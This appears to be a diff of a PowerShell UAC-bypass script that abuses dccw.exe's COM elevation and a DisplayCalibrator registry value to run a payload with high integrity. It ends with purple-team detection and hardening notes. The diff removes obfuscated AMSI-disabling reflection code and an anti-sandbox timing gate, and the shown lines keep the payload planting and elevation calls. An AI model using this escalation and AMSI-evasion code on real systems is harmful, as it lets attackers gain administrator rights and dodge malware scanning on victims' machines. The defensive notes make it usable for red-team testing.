@@ -21,7 +21,7 @@
     │   (Display Color Calibration Wizard) with a High-integrity token.       │
     │                                                                         │
     │ Stage 3 — Elevated execution:                                           │
-    │   dccw.exe reads HKCU\...\ICM\Calibration\DisplayCalibrator and        │
+    │   dccw.exe reads HKCU\...\\ICM\Calibration\DisplayCalibrator and        │
     │   executes the registered calibration application — our payload.        │
     │                                                                         │
     │ Combining COM elevation with a registry read that dccw.exe performs    │
@@ -60,17 +60,11 @@
     Note: dccw.exe will ShellExecute this path — it must be a valid binary.
     Works best with fully-qualified paths (e.g. C:\Windows\System32\cmd.exe).
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .PARAMETER Timeout
     Seconds to wait for dccw.exe to launch and read the registry (default: 5).
 
 .EXAMPLE
-    Invoke-DccwCOMBypass -Payload "C:\Windows\System32\cmd.exe" -SkipChecks
+    Invoke-DccwCOMBypass -Payload "C:\Windows\System32\cmd.exe"
 
 .EXAMPLE
     $ps = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
@@ -81,6 +75,8 @@
     dccw.exe executes the DisplayCalibrator value directly as a process;
     command-line arguments embedded in the path string should work, but
     wrapping in cmd.exe is more reliable if arguments are needed.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -89,54 +85,11 @@ param(
     [ValidateNotNullOrEmpty()]
     [string]$Payload,
 
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
-    [int]   $Timeout = 5
+    [int]$Timeout = 5
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
-
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[DccwCOM] Already elevated — no bypass needed.'
-        return
-    }
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[DccwCOM] AlwaysNotify active — method will not work silently."
-        return
-    }
-    # Timing gate
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[DccwCOM] Timing anomaly — aborting.'
-        return
-    }
-}
-#endregion
 
 #region ── Stage 1: Plant DisplayCalibrator registry value ───────────────────
 # Registry path constructed in segments
@@ -245,7 +198,7 @@ try {
     }
     # LaunchDccw(IntPtr.Zero) — starts dccw.exe with High integrity
     $xHr = $xProxy.LaunchDccw([IntPtr]::Zero)
-    Write-Verbose ("[DccwCOM] LaunchDccw HRESULT: 0x{0:X8}" -f $xHr)
+    Write-Verbose (("[DccwCOM] LaunchDccw HRESULT: 0x{0:X8}") -f $xHr)
     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($xProxy) | Out-Null
 
     Start-Sleep -Seconds $Timeout
@@ -276,7 +229,7 @@ PURPLE-TEAM NOTES
 
 UNIQUE DETECTION PROFILE VS OTHER METHODS:
   This method leaves a footprint in a registry path that is not commonly
-  monitored: HKCU\...\ICM\Calibration\DisplayCalibrator.
+  monitored: HKCU\...\\ICM\Calibration\DisplayCalibrator.
   The key is only written by legitimate display calibration workflows
   (ICC profile management, Windows Display Calibration tool).
   A write to this key from a non-display-management context is highly
@@ -299,7 +252,7 @@ KEY TEST QUESTIONS FOR BLUE TEAM:
   3. Does the D2E7041B CLSID COM elevation trigger a CS indicator?
 
 HARDENING RECOMMENDATIONS:
-  ● SACL on HKCU\...\ICM\Calibration
+  ● SACL on HKCU\...\\ICM\Calibration
   ● Monitor dccw.exe child processes (Sysmon EID 1 / CS process tree)
   ● AlwaysNotify UAC eliminates this method entirely
 
